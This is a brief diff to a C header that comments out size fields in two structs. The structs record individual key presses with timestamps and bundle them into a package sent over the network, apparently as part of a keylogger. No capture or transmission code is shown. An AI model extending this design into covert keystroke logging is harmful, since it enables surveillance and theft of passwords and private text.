@@ -19,7 +19,7 @@
  * Represents all the associated data for one key that was pressed
  */
 typedef struct {
-  size_t size;      // An integer representing the size of the key_info.
+  // size_t size;      // An integer representing the size of the key_info.
   char* key;        // A string representing a key that was pressed.
   char* timestamp;  // The approximate time (UTC) that the key was pressed.
   // char* application; /* Represents the active application of the user when
@@ -31,7 +31,7 @@ typedef struct {
  * Represents all the data that is sent over the network
  */
 typedef struct {
-  size_t size;     // An integer representing the size of the key_package.
+  // size_t size;     // An integer representing the size of the key_package.
   key_info* keys;  // An array of keys to be sent over the network.
   size_t keys_arr_size;
   // char* host_device_name;  // A string representing the device name of the
